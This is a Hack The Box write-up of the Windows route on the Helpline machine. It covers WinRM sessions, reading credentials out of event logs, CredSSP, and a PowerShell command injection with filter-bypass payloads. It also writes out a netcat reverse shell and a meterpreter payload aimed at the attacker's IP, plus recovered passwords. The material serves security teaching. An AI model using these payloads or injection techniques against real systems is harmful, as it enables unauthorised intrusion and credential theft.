---
title: HTB: Helpline Windows
url: https://0xdf.gitlab.io/2019/08/17/htb-helpline-win.html
date: 2019-08-17T13:45:00+00:00
tags: ctf, hackthebox, htb-helpline, winrm, pssession, clm, applocker, msfvenom, smb, postgresql, wevtutil, credssp, cipher, icacls, cron, powershell, injection, command-injection, filter, cor-profiler, visual-studio, meterpreter, beryllium, secure-string, powershell-credential, commando, htb-ethereal
---

![commando](/icons/commando.png)

I luckily decided to use Helpline as my test run for Commando VM. That allowed me to avoid challenges that I would have faces using Kali. This is the primary intended route for Helpline, using Windows to connect to the host. Up to this point, my recon has provided credentials for alice and zachary (and some others). I’ll pick up here, getting a shell as alice, using zachary’s creds to find tolu’ss creds in event logs. I can use those creds to get a WinRM shell as tolu, who can access leo’s scripts, one of which I can inject into to get a shell as leo. On leo’s desktop, there’s a powershell secure string exported as xml that is the administrator password, which I can decrypt and then WinRM as administrator.

## Shell as alice

Were I working from Kali, I would use [Alamot’s ruby WinRM shell](https://github.com/Alamot/code-snippets/tree/master/winrm). That would actually have worked fine on this part. It would fail later when I would get to `user.txt`, and I’ll explain that then. Luckily, I was using Windows, so I could connect with PSSession. I’ll need to do a bit of config on this box first.

### Enable WinRM
1. Add helpline to hosts. Windows likes talking hostnames instead of IPs, so this makes things easier.

   ```

   # localhost name resolution is handled within DNS itself.
   #	127.0.0.1       localhost
   #	::1             localhost
   10.10.10.132		helpline

   ```
2. In a `cmd` window, run `winrm quickconfig`. This starts the WinRM service, opens the firewall, etc.
3. Add all hosts to my trusted hosts list. This will allow me to connect to HELPLINE:

   ```

   C:\Users\0xdf>winrm set winrm/config/client @{TrustedHosts="*"}
   Client
       NetworkDelayms = 5000
       URLPrefix = wsman
       AllowUnencrypted = false
       Auth
           Basic = true
           Digest = true
           Kerberos = true
           Negotiate = true
           Certificate = true
           CredSSP = false
       DefaultPorts
           HTTP = 5985
           HTTPS = 5986
       TrustedHosts = *

   ```
4. Enable CredSSP. This will allow me to connect with `-authentication CredSSP` later. In PowerShell, run `Enable-WSManCredSSP -Role "Client" -DelegateComputer "*"`.
5. Allow delegation by opening `gpedit.msc` (as administrator), and navigating to Computer Configuration -> Administrative Templates -> System -> Credentials Delegations -> Allow Delegating Fresh Credendials with NTLM only server authentication. Select Enabled, and add helpline to the list:

[![delegation group policy](https://0xdfimages.gitlab.io/img/1555271260255.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/1555271260255.png)

### Enter-PSSession

Now I can get onto the box as alice. I noted in the original recon that WinRM was open, and in trying all the creds I have collected, I found that alice’s creds “$sys4ops@megabank!” worked. On Windows, to get a WinRM shell, I’ll use `Enter-PSSession`:

```

PS C:\Users\0xdf > Enter-PSSession -ComputerName helpline -Credential helpline\alice

Windows PowerShell credential request
Enter your credentials.
Password for user helpline\alice: ******************

[helpline]: PS C:\Users\alice\Documents>

```

Note I’m not using `CredSSP` authentication here. I can, but I don’t need to at this point. Again, more later.

### Limited Shell

This shell is a very limited one. I’m in Constrained language mode:

```

[helpline]: PS C:\Users\alice\Documents> $ExecutionContext.SessionState.LanguageMode
ConstrainedLanguage

```

I also can’t run any executables due to AppLocker:

```

[helpline]: PS C:\Users\alice\AppData\Local\Temp> .\nc.exe -e cmd.exe 10.10.14.14 443
Program 'nc.exe' failed to run: This program is blocked by group policy. For more information, contact your system
administrator.ax of this command is:
    + CategoryInfo          : ResourceUnavailable: (:) [], ApplicationFailedException], RemoteException
    + FullyQualifiedErrorId : NativeCommandFailed

```

I tried several CLM and AppLocker breakouts, without much success.

[AMSI](https://docs.microsoft.com/en-us/windows/desktop/amsi/how-amsi-helps) is also enabled. I don’t tend to rely on Metasploit, but for the sake of demonstration, if I try to even copy a meterpreter payload over to target, it flags and blocks:

```

C:\share>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.14 LPORT=443 -f exe -o met.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 510 bytes
Final size of exe file: 7168 bytes
Saved as: met.exe

```

```

[helpline]: PS C:\Windows\System32\spool\drivers\color> copy \\10.10.14.14\share\met.exe met.exe
Operation did not complete successfully because the file contains a virus or potentially unwanted software.
    + CategoryInfo          : NotSpecified: (:) [Copy-Item], IOException
    + FullyQualifiedErrorId : System.IO.IOException,Microsoft.PowerShell.Commands.CopyItemCommand

```

### Transport

I’ll primarily rely on two methods for moving files to and from Helpline.

#### SMB

Since I’m using a Windows attack box, I’ll enable an actual SMB share. I created a user, dummy, with no group membership outside of Users. I created a folder, `C:\share`. In properties I went to “Sharing” -> “Advanced Sharing…”. There I checked the “Share this folder” box, and then clicked on Permissions. I added dummy, and removed all other users:

![1555118954476](https://0xdfimages.gitlab.io/img/1555118954476.png)

Then, back to the folder properties, I went to the “Security” tab, and made sure that dummy had full control of the folder.

Now, from target, I can use `net use` to establish the connection, and then copy to and from the folder:

```

[helpline]: PS C:\> net use /u:dummy \\10.10.14.14\share [password]
The command completed successfully

```

Now I can copy to and from the UNC path `\\10.10.14.14\share\`.

#### HTTP

I can’t `new-object net.webclient` because of constrained language mode, but I can `invoke-webrequest` (or `iwr`). I’ll use `python -m http.server` on my windows host just like on my Kali box (except it’s python3 by default here, so `http.server` instead of `SimpleHTTPServer`).

I gave an example of this above when I used it to get `nc`:

```

[helpline]: PS C:\Users\alice\AppData\Local\Temp> iwr -uri http://10.10.14.14/nc64.exe -OutFile nc.exe

```

## Shell as tolu

### Enumeration

In looking around, it’s always a good idea to check out the database associated with a website. I won’t actually find anything that I didn’t get from the [database backup I retrieved via LFI](/2019/08/17/htb-helpline.html#extract-database-backup), but if I hadn’t done that, I could have found those credentials via the shell as alice.

The SPD instance is located on the `E:` drive in `ManagedEngine`:

```

[helpline]: PS E:\ManageEngine> dir

    Directory: E:\ManageEngine

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        1/16/2019   9:31 PM                ServiceDesk 

```

The [SDP documentation](https://www.manageengine.co.uk/products/service-desk-msp/help/installation-guide/documents/configure-database.html) gives the location of `psql.exe` as well as some examples commands to connect to it. I had to play with this for a while to get it working, but eventually the command I found to work was:

```

[helpline]: PS E:\ManageEngine\ServiceDesk\pgsql\bin> ./psql.exe -h 127.0.0.1 -p 65432 -U postgres -w -c "\list"
                              List of databases
    Name     |  Owner   | Encoding | Collate | Ctype |   Access privileges
-------------+----------+----------+---------+-------+-----------------------
 postgres    | postgres | UTF8     | C       | C     |
 servicedesk | postgres | UTF8     | C       | C     |
 template0   | postgres | UTF8     | C       | C     | =c/postgres          +
             |          |          |         |       | postgres=CTc/postgres
 template1   | postgres | UTF8     | C       | C     | =c/postgres          +
             |          |          |         |       | postgres=CTc/postgres
(4 rows)

```

I’ll dump the tables in `servicedesk`

```

[helpline]: PS E:\ManageEngine\ServiceDesk\pgsql\bin> ./psql.exe -h 127.0.0.1 -p 65432 -U postgres -w -d servicedesk -c "\dt"
                     List of relations
 Schema |              Name              | Type  |  Owner
--------+--------------------------------+-------+----------
 public | aaaaccadminprofile             | table | postgres
 public | aaaaccbadloginstatus           | table | postgres
...[snip]...
 public | aaapassword                    | table | postgres
...[snip]...

```

I’ll check out `aaapassword` and find the same hashes I found in the database:

```

[helpline]: PS E:\ManageEngine\ServiceDesk\pgsql\bin> ./psql.exe -h 127.0.0.1 -p 65432 -U postgres -w -d servicedesk -c "select * from aaapassword;"
 password_id |                           password                           | algorithm |             salt              | passwdprofile_id | passwdrule_id |  createdtime  | factor
-------------+--------------------------------------------------------------+-----------+-------------------------------+------------------+---------------+---------------+--------
           1 | $2a$12$6VGARvoc/dRcRxOckr6WmucFnKFfxdbEMcJvQdJaS5beNK0ci0laG | bcrypt    | $2a$12$6VGARvoc/dRcRxOckr6Wmu |                2 |             1 | 1545350288006 |     12
         302 | $2a$12$2WVZ7E/MbRgTqdkWCOrJP.qWCHcsa37pnlK.0OyHKfd4lyDweMtki | bcrypt    | $2a$12$2WVZ7E/MbRgTqdkWCOrJP. |                2 |             1 | 1545428506907 |
         303 | $2a$12$Em8etmNxTinGuub6rFdSwubakrWy9BEskUgq4uelRqAfAXIUpZrmm | bcrypt    | $2a$12$Em8etmNxTinGuub6rFdSwu |                2 |             1 | 1545428808687 |
           2 | $2a$12$hmG6bvLokc9jNMYqoCpw2Op5ji7CWeBssq1xeCmU.ln/yh0OBPuDa | bcrypt    | $2a$12$hmG6bvLokc9jNMYqoCpw2O |                2 |             1 | 1545428960671 |     12
         601 | $2a$12$6sw6V2qSWANP.QxLarjHKOn3tntRUthhCrwt7NWleMIcIN24Clyyu | bcrypt    | $2a$12$6sw6V2qSWANP.QxLarjHKO |                2 |             1 | 1545514864248 |
         602 | $2a$12$X2lV6Bm7MQomIunT5C651.PiqAq6IyATiYssprUbNgX3vJkxNCCDa | bcrypt    | $2a$12$X2lV6Bm7MQomIunT5C651. |                2 |             1 | 1545515091170 |
         603 | $2a$12$gFZpYK8alTDXHPaFlK51XeBCxnvqSShZ5IO/T5GGliBGfAOxwHtHu | bcrypt    | $2a$12$gFZpYK8alTDXHPaFlK51Xe |                2 |             1 | 1545516114589 |
         604 | $2a$12$4.iNcgnAd8Kyy7q/mgkTFuI14KDBEpMhY/RyzCE4TEMsvd.B9jHuy | bcrypt    | $2a$12$4.iNcgnAd8Kyy7q/mgkTFu |                2 |             1 | 1545517215465 |
(8 rows)

```

I can crack them [as before](/2019/08/17/htb-helpline.html#crack-passwords).

### zachary

alice doesn’t have any interesting files in her home directory, so I started looking at other users:

```

[helpline]: PS C:\Users\alice\Documents> net user

User accounts for \\
-------------------------------------------------------------------------------
Administrator            alice                    DefaultAccount
Guest                    leo                      niels
tolu                     WDAGUtilityAccount       zachary
The command completed with one or more errors.

```

zachary jumped out, since I had his SDP password, and password reuse is common. Looking more closely at zachary, I noticed he’s in the `Event Log Readers` group.

```

[helpline]: PS C:\Users\alice\Documents> net user zachary
User name                    zachary
Full Name                    zachary
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            12/21/2018 10:25:34 PM
Password expires             Never
Password changeable          12/21/2018 10:25:34 PM
Password required            Yes
User may change password     No

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   12/28/2018 10:57:32 PM

Logon hours allowed          All

Local Group Memberships      *Event Log Readers    *Users
Global Group memberships     *None
The command completed successfully.

```

I can’t use zachary’s credentials to get a shell, as he’s not administrators or in “Remove Management Users” groups:

```

[helpline]: PS C:\Users\alice\Documents> net localgroup "Remote Management Users"
Alias name     Remote Management Users
Comment        Members of this group can access WMI resources over management protocols (such as WS-Management via the Windows Remote Management service). This applies only to WMI namespaces that grant access to the user.

Members
-------------------------------------------------------------------------------
alice
tolu
The command completed successfully.

```

### Logs

In thinking about ways to read event logs, in addition to PowerShell’s `Get-EventLog`, there’s also `wevtutil.exe`. The [docs](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/wevtutil) show that `wevtutil` can take a `/u` parameter to specify the user and a `/p` parameter to specify the password for that user. That means that I can query event logs as zachary from my shell as alice.

Getting through these logs was a bit of a slog. After a few queries, I dumped the full security log into a file that I could `findstr` against:

```

[helpline]: PS C:\> wevtutil.exe /u:HELPLINE\zachary /r:helpline /p:0987654321 /rd:true qe security /f:text > sec.txt

```

I’ll pull `sec.txt` back to my host, and dig around. I started looking for logs about other users on the box, and especially tolu, as that user is in the “Remote Management Users” group. These lines jumped out at me:

```

Process Command Line:   "C:\Windows\system32\net.exe" use T: \\helpline\helpdesk_stats /USER:tolu !zaq1234567890pl!99
Process Command Line:   "C:\Windows\system32\systeminfo.exe" /S \\helpline /U /USER:tolu /P !zaq1234567890pl!99

```

Two independent program executions with the same password for tolu. I pulled the full log entries for each of these events:

```

  Event[20183]:
    Log Name: Security
    Source: Microsoft-Windows-Security-Auditing
    Date: 2018-12-28T22:37:35.358
    Event ID: 4688
    Task: Process Creation
    Level: Information
    Opcode: Info
    Keyword: Audit Success
    User: N/A
    User Name: N/A
    Computer: HELPLINE
    Description:
  A new process has been created.

  Creator Subject:
        Security ID:            S-1-5-21-3107372852-1132949149-763516304-500
        Account Name:           Administrator
        Account Domain:         HELPLINE
        Logon ID:               0x75935

  Target Subject:
        Security ID:            S-1-0-0
        Account Name:           -
        Account Domain:         -
        Logon ID:               0x0

  Process Information:
        New Process ID:         0xbbc
        New Process Name:       C:\Windows\System32\net.exe
        Token Elevation Type:   %%1936
        Mandatory Label:                S-1-16-12288
        Creator Process ID:     0x340
        Creator Process Name:   C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
        Process Command Line:   "C:\Windows\system32\net.exe" use T: \\helpline\helpdesk_stats /USER:tolu !zaq1234567890pl!99

  Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

  Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

  Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

  Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.

```

```

  Event[19982]:
    Log Name: Security
    Source: Microsoft-Windows-Security-Auditing
    Date: 2018-12-28T22:40:28.779
    Event ID: 4688
    Task: Process Creation
    Level: Information
    Opcode: Info
    Keyword: Audit Success
    User: N/A
    User Name: N/A
    Computer: HELPLINE
    Description:
  A new process has been created.

  Creator Subject:
        Security ID:            S-1-5-21-3107372852-1132949149-763516304-500
        Account Name:           Administrator
        Account Domain:         HELPLINE
        Logon ID:               0x75935

  Target Subject:
        Security ID:            S-1-0-0
        Account Name:           -
        Account Domain:         -
        Logon ID:               0x0

  Process Information:
        New Process ID:         0xbd8
        New Process Name:       C:\Windows\System32\systeminfo.exe
        Token Elevation Type:   %%1936
        Mandatory Label:                S-1-16-12288
        Creator Process ID:     0x340
        Creator Process Name:   C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
        Process Command Line:   "C:\Windows\system32\systeminfo.exe" /S \\helpline /U /USER:tolu /P !zaq1234567890pl!99

  Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

  Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

  Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

  Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.

```

Both were instances of administrator running a process as tolu.

### Enter-PSSession

Remembering that tolu was in the “Remote Management Users” group, I can create a new session as tolu, using the password “!zaq1234567890pl!99”:

```

PS C:\Users\0xdf\hackthebox\helpline-10.10.10.132 > Enter-PSSession -ComputerName helpline -Credential tolu

Windows PowerShell credential request
Enter your credentials.
Password for user tolu: *******************

[helpline]: PS C:\Users\tolu>

```

The shell is still limited:

```

[helpline]: PS C:\Users\tolu\Desktop> $ExecutionContext.SessionState.LanguageMode
ConstrainedLanguage

```

### user.txt / CredSSP

And I’ll find `uset.txt` on tolu’s desktop. But I can’t read it:

```

[helpline]: PS C:\Users\tolu\desktop> type user.txt
type : Access to the path 'C:\Users\tolu\desktop\user.txt' is denied.
    + CategoryInfo          : PermissionDenied: (C:\Users\tolu\desktop\user.txt:String) [Get-Content], UnauthorizedAcc
   essException
    + FullyQualifiedErrorId : GetContentReaderUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetContentCommand

```

It’s not a permissions thing, as I have full control on the file:

```

[helpline]: PS C:\Users\tolu\Desktop> icacls .\user.txt
.\user.txt NT AUTHORITY\SYSTEM:(I)(F)
           BUILTIN\Administrators:(I)(F)
           HELPLINE\tolu:(I)(F)

```

It is because the file is encrypted. For demonstration, I’ll create another file on the desktop:

```

[helpline]: PS C:\Users\tolu\desktop> echo 0xdf > 0xdf.txt

```

Now I’ll use `cipher` to get information:

```

[helpline]: PS C:\Users\tolu\Desktop> cipher

 Listing C:\Users\tolu\Desktop\
 New files added to this directory will not be encrypted.

U 0xdf.txt
E user.txt

```

I can see that `user.txt` has an `E` for encrypted. The other file I just made has a `U` for unencrypted.

It turns out this is an issue with WinRM and how it authenticates securely by default. It doesn’t send my password or the necessary material to decrypt the file. I can force it to do that using the `-Authentication CredSSP` option. It’s less secure, but it includes the full credential, and thus is able to decrypt files as well. This is the part that I don’t know any way to do from a Linux client.

I enabled it earlier when I was setting up WinRM. Now I just need to add the option when I connecct:

```

PS > Enter-PSSession -ComputerName helpline -Credential tolu -Authentication Credssp

Windows PowerShell credential request
Enter your credentials.
Password for user tolu: *******************

[helpline]: PS C:\Users\tolu\Desktop> type user.txt
0d522fa8...

```

## Shell as leo

### Enumeration

As tolu, I can now access folders on `E:\` that I couldn’t before, `Helpdesk_Stats`, `Restore`, and `Scripts`:

```

[helpline]: PS E:\> icacls * /C
$RECYCLE.BIN BUILTIN\Administrators:(OI)(CI)(F)
             NT AUTHORITY\SYSTEM:(OI)(CI)(F)
             BUILTIN\Users:(NP)(RX,AD,WA)
             Mandatory Label\Low Mandatory Level:(OI)(CI)(IO)(NW)

icacls : Backups: Access is denied.
    + CategoryInfo          : NotSpecified: (Backups: Access is denied.:String) [], RemoteException
    + FullyQualifiedErrorId : NativeCommandError

Helpdesk_Stats NT AUTHORITY\SYSTEM:(OI)(CI)(F)
               HELPLINE\Administrator:(OI)(CI)(F)
               BUILTIN\Administrators:(OI)(CI)(F)
               HELPLINE\tolu:(OI)(CI)(RX)

ManageEngine BUILTIN\Administrators:(OI)(CI)(F)
             NT AUTHORITY\SYSTEM:(OI)(CI)(F)
             CREATOR OWNER:(OI)(CI)(IO)(F)
             BUILTIN\Users:(OI)(CI)(RX)

ManageEngine_ServiceDesk_Plus.exe BUILTIN\Administrators:(I)(F)
                                  NT AUTHORITY\SYSTEM:(I)(F)
                                  BUILTIN\Users:(I)(RX)

Restore Everyone:(DENY)(D,WA)
        CREATOR OWNER:(OI)(CI)(IO)(F)
        NT AUTHORITY\SYSTEM:(OI)(CI)(F)
        HELPLINE\leo:(OI)(CI)(M)
        BUILTIN\Administrators:(OI)(CI)(F)
        HELPLINE\tolu:(OI)(CI)(RX)

Scripts Everyone:(DENY)(D,WDAC,WO,WA)
        NT AUTHORITY\SYSTEM:(OI)(CI)(N)
        CREATOR OWNER:(OI)(CI)(IO)(F)
        HELPLINE\leo:(OI)(CI)(M)
        HELPLINE\tolu:(OI)(CI)(M)
        BUILTIN\Administrators:(OI)(CI)(F)

System Volume Information
:
Access is denied.
Successfully processed 6 files; Failed processing 2 files

```

`Helpdesk_Stats` contains an xls file that didn’t provide anything interesting.

`Restore` was empty.

`Scripts` has 3 files and a folder:

```

[helpline]: PS E:\Scripts> ls

    Directory: E:\Scripts

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----       12/18/2018  10:18 AM                Processing
-a----        4/13/2019  10:25 AM            593 output.txt
-a----        1/20/2019  10:01 PM           7466 SDP_Checks.ps1
-a----       12/18/2018  10:18 AM            183 successful_backups.txt

```

I’ll note right away that three of the four were last modified a few months ago, but `output.txt` was modified 3 minutes ago. That’s a good sign that something is running that’s creating this output.

I’ll also notice that as tolu, I can modify `output.txt`, and read but not modify `SDP_Checks.ps1` and `successful_backups.txt`:

```

[helpline]: PS E:\Scripts> icacls * /C
output.txt NT AUTHORITY\SYSTEM:(I)(N)
           HELPLINE\leo:(I)(F)
           HELPLINE\tolu:(I)(M)
           BUILTIN\Administrators:(I)(F)

icacls : Processing: Access is denied.
    + CategoryInfo          : NotSpecified: (Processing: Access is denied.:String) [], RemoteException
    + FullyQualifiedErrorId : NativeCommandError

SDP_Checks.ps1 NT AUTHORITY\SYSTEM:(N)
               HELPLINE\leo:(RX)
               HELPLINE\tolu:(R)
               BUILTIN\Administrators:(F)

successful_backups.txt NT AUTHORITY\SYSTEM:(F)
                       HELPLINE\leo:(RX)
                       BUILTIN\Administrators:(F)
                       HELPLINE\tolu:(RX)

Successfully processed 3 files; Failed processing 1 files

```

### SDP\_Checks.ps1

Some digging into `SDP_Checks.ps1` and `output.txt` quickly shows that `output.txt` is the output of this script’s being run, and watching the timestamps shows it seems to be running every 5 minutes, and given the permissions above, probably by leo.

Here is `SDP_Checks.ps1`:

```

# script to check ServiceDesk Plus status, and restore backup from secure folder if needed
# please report any issues - leo

E:
cd E:\Scripts

Remove-Item E:\Scripts\output.txt
Get-Date | Add-Content E:\Scripts\output.txt

# check port is listening

Add-Content E:\Scripts\output.txt ""
Add-Content E:\Scripts\output.txt "Check if listening on 8080"

netstat -ano | Select-String "8080" | Out-File E:\Scripts\output.txt -Append -Encoding ASCII

# check API

Add-Content E:\Scripts\output.txt ""
Add-Content E:\Scripts\output.txt "Check API status"

Invoke-RestMethod -Uri http://helpline:8080/sdpapi/request/1/ -Method Post -Body @{OPERATION_NAME='GET_REQUEST';TECHNICIAN_KEY='CDDBD0A5-5D71-48DE-8FF7-CB9751F0FE7C';} | Out-File E:\Scripts\output.txt -Append -Encoding ASCII

# check service status

Add-Content E:\Scripts\output.txt ""
Add-Content E:\Scripts\output.txt "Check servicedesk service status"

Get-Service servicedesk | Out-File E:\Scripts\output.txt -Append -Encoding ASCII

# restore ServiceDesk data from secure backup folder if required
# put name of folder in backups.txt to retrieve it, e.g. backup_postgres_9309_fullbackup_mon

if (Test-Path E:\Scripts\backups.txt) {

    Copy-Item E:\Scripts\backups.txt E:\Scripts\Processing\backups.txt

    # sanitize user input

    $file = Get-Content E:\Scripts\Processing\backups.txt
    $file -replace "exe","" > E:\Scripts\Processing\backups.txt
    $file = Get-Content E:\Scripts\Processing\backups.txt
    $file -replace "msi","" > E:\Scripts\Processing\backups.txt
    $file = Get-Content E:\Scripts\Processing\backups.txt
    $file -replace "ps1","" > E:\Scripts\Processing\backups.txt
    $file = Get-Content E:\Scripts\Processing\backups.txt
    $file -replace "cmd","" > E:\Scripts\Processing\backups.txt
    $file = Get-Content E:\Scripts\Processing\backups.txt
    $file -replace "bat","" > E:\Scripts\Processing\backups.txt
    $file = Get-Content E:\Scripts\Processing\backups.txt
    $file -replace "dll","" > E:\Scripts\Processing\backups.txt
    $file = Get-Content E:\Scripts\Processing\backups.txt
    $file -replace " ","" > E:\Scripts\Processing\backups.txt
    $file = Get-Content E:\Scripts\Processing\backups.txt
    $file -replace "&","" > E:\Scripts\Processing\backups.txt
    $file = Get-Content E:\Scripts\Processing\backups.txt
    $file -replace "{","" > E:\Scripts\Processing\backups.txt
    $file = Get-Content E:\Scripts\Processing\backups.txt
    $file -replace "}","" > E:\Scripts\Processing\backups.txt
    $file = Get-Content E:\Scripts\Processing\backups.txt
    $file -replace "/","" > E:\Scripts\Processing\backups.txt
    $file = Get-Content E:\Scripts\Processing\backups.txt
    $file -replace "\\","" > E:\Scripts\Processing\backups.txt
    $file = Get-Content E:\Scripts\Processing\backups.txt
    $file -replace """","" > E:\Scripts\Processing\backups.txt
    $file = Get-Content E:\Scripts\Processing\backups.txt
    $file -replace "\'","" > E:\Scripts\Processing\backups.txt
    $file = Get-Content E:\Scripts\Processing\backups.txt
    $file -replace "\(","" > E:\Scripts\Processing\backups.txt
    $file = Get-Content E:\Scripts\Processing\backups.txt
    $file -replace "\)","" > E:\Scripts\Processing\backups.txt
    $file = Get-Content E:\Scripts\Processing\backups.txt
    $file -replace "\.","" > E:\Scripts\Processing\backups.txt

    ForEach ($backup in Get-Content "E:\Scripts\Processing\backups.txt")
    {
      $Command = "echo D | xcopy /E /R /C /Y /H /F /V E:\Backups\$backup E:\Restore\$backup"
      Invoke-Expression $Command
    }

    Remove-Item E:\Scripts\backups.txt
    Remove-Item E:\Scripts\Processing\backups.txt
}

```

The first half of this script is pretty simple, running some commands and adding output to `output.txt`. The interesting part is the last `ForEach` block, where the script creates a command string, attempts to sanitize it, and then executes it. Any time string is created and then executed, there is potential for injection.

### Injection

Ignoring the sanitization for a minute, if I can set `$backup` to `; echo "0xdf" #`, then command would come out to be:

```

echo D | xcopy /E /R /C /Y /H /F /V E:\Backups\;
echo "0xdf" # E:\Restore\; echo 0xdf #

```

The first line would fail (because `xcopy` requires a destination), and then it would output `0xdf`. I can show this on my local host:

```

PS > $backup = '; echo "0xdf" #'
PS > $Command = "echo D | xcopy /E /R /C /Y /H /F /V E:\Backups\$backup E:\Restore\$backup"
PS > $Command
echo D | xcopy /E /R /C /Y /H /F /V E:\Backups\; echo "0xdf" # E:\Restore\; echo "0xdf" #
PS > iex($Command)
Invalid drive specification
0 File(s) copied
0xdf

```

On my machine, the `xcopy` failed because `E:\Backups` didn’t exist, but even if it had, it would have failed for another reason. The point is that `0xdf` was output. That means I can run arbitrary commands.

`$backup` is set in a `ForEach` loop over each line in `E:\Scripts\Processing\backups.txt`. At the top of this section of code, if `E:\Scripts\backups.txt` exists, it is copied into the `Processing` folder. Since I can write `E:\Scripts\backups.txt`, I can control this input.

What makes this an interesting challenge is the filtering that happen to prevent injection. For example:

```

    $file = Get-Content E:\Scripts\Processing\backups.txt
    $file -replace "exe","" > E:\Scripts\Processing\backups.txt

```

These lines will get the content of the file, replace and instances of the string “exe” with “”, and then write the results back to the file. The entire block will remove `exe`, `msi`, `ps1`, `cmd`, `bat`, `dll`, as well as space and the following characters: `&{}/\"'().`. So my challenge is to come up with an injection that doesn’t require any of those. Luckily I still have `;` so I can chain multiple commands. Finding a way to get around without spaces is the main challenge.

I also needed a payload that would run in constrained language mode, as I’ll presume the next user (likely leo based on permissions above) is likely to have the same restrictions I have faced with the last two users.

### Filter Bypass

I’ll show three different ways to bypass this filter:

#### Tabs

The first way I found was to use tabs as whitespace instead of spaces which were removed. I stored the actual payload I wanted to run in a file in the scripts directory, `payload`. Then I set `backups.txt`:

```

[helpline]: PS E:\Scripts> echo ";`$c=get-content`tpayload;iex`t`$c;#" > backups.txt
[helpline]: PS E:\Scripts> Get-Content .\backups.txt
;$c=get-content payload;iex     $c;#

```

That will set command to (with 2 newlines added by me for readability):

```

echo D | xcopy /E /R /C /Y /H /F /V E:\Backups\;
$c=get-content  payload;
iex     $c;# E:\Restore\;$c=get-content payload;iex     $c;#

```

That will fail the `xcopy`, load whatever I have in `payload` into `$c`, and then run it with `iex $c`.

#### Variable Substrings

The other option is to build a string using variable names I can expect to be in the PowerShell session and `iex` it. This is commonly done in phishing documents to get around string match detection. I have the benefit here of knowing the script I’ll be running in, so I’m going to take one shortcut where I can reference my own content to make it easier and give me characters that might be harder to find in default variables.

A variable, `$backup` will be set with my input. For example, to show how I can start building a string, if I start with a file containing:

```

;$c=$backup[1]+$backup[5]+$backup[3];$c|iex;#

```

Then `$backup` will be that string. When `$Command` is set, it will look like:

```

echo D | xcopy /E /R /C /Y /H /F /V E:\Backups\;$c=$backup[1]+$backup[5]+$backup[3];$c|iex;# E:\Restore\;$c=$backup[1]+$backup[5]+$backup[3];$c|iex;#

```

If I add newlines after `;` and remove the comments:

```

echo D | xcopy /E /R /C /Y /H /F /V E:\Backups\;
$c=$backup[1]+$backup[5]+$backup[3];
$c|iex;

```

That builds a string, and executes it!

In this case, I haven’t done enough, as `$backup[1]+$backup[5]+$backup[3]` translates to `$b=`, which isn’t valid PowerShell. But I’ll continue to build out a full command. To test locally, I’ve created a file in the same directory, `a`:

```

cmd /c "echo yay"

```

I’ll set `$backup` (simulates reading it from a file):

```

PS C:\Users\0xdf > $backup = ';$c=$backup[1]+$backup[5]+$backup[3]+$backup[2]+$backup[6]+$PSSessionConfigurationName[2]+$env:programfiles[10]+$backup[6]+$backup[0]+$backup[-5]+$backup[-4]+$backup[-3]+$env:programfiles[10]+$backup[1]+$backup[5];$c|iex;#'

```

Now I’ll set `$Command` just as the script does it:

```

PS C:\Users\0xdf > $Command = "echo D | xcopy /E /R /C /Y /H /F /V E:\Backups\$backup E:\Restore\$backup"

PS C:\Users\0xdf > $Command
echo D | xcopy /E /R /C /Y /H /F /V E:\Backups\;$c=$backup[1]+$backup[5]+$backup[3]+$backup[2]+$backup[6]+$PSSessionConfigurationName[2]+$env:programfiles[10]+$backup[6]+$backup[0]+$backup[-5]+$backup[-4]+$backup[-3]+$env:programfiles[10]+$backup[1]+$backup[5];$c|iex;# E:\Restore\;$c=$backup[1]+$backup[5]+$backup[3]+$backup[2]+$backup[6]+$PSSessionConfigurationName[2]+$env:programfiles[10]+$backup[6]+$backup[0]+$backup[-5]+$backup[-4]+$backup[-3]+$env:programfiles[10]+$backup[1]+$backup[5];$c|iex;#

```

Here’s what `$c` evaluates to:

```

PS C:\Users\0xdf > $c=$backup[1]+$backup[5]+$backup[3]+$backup[2]+$backup[6]+$PSSessionConfigurationName[2]+$env:programfiles[10]+$backup[6]+$backup[0]+$backup[-5]+$backup[-4]+$backup[-3]+$env:programfiles[10]+$backup[1]+$backup[5];

PS C:\Users\0xdf > $c
$b=cat a;iex $b

```

So I can `iex $Command` and see `a` runs, with a failed `xcopy` and then my silly cmd echo:

```

PS C:\Users\0xdf > iex $Command
Invalid drive specification
0 File(s) copied
yay

```

#### [char]

There’s another filter bypass, where I can use `[char]67` to represent `A`. So I could pretty easily create a payload that uses `[char]32` for space instead of tab.

#### Conclusion

If this is at all unclear, open up a `PowerShell` window and start playing around until you get it. The way that user input in a file is moved to a variable (`$backup`) which is used to create another string variable (`$Command`) which is then executed is confusing for sure.

### Payload

